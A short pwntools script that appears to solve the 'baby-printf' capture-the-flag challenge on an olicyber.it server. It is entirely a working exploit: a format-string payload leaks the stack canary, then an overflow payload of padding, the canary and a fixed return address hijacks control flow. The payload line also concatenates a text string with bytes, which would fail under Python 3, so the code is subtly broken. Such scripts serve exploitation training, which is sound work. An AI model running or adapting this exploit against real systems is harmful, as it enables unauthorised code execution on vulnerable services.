from pwn import *
 
p = remote('baby-printf.challs.olicyber.it', 34004)
# payload = b'%23$p'
p.recvuntil(b'back:')
p.sendline(b'%23$p')
canary = p.recvline()
print(canary)
payload = 'a'*40 + p64(int(canary, 16)) + b'a'*8 + p64(0x4011d6)
p.sendline(payload)
p.sendline(b'!q')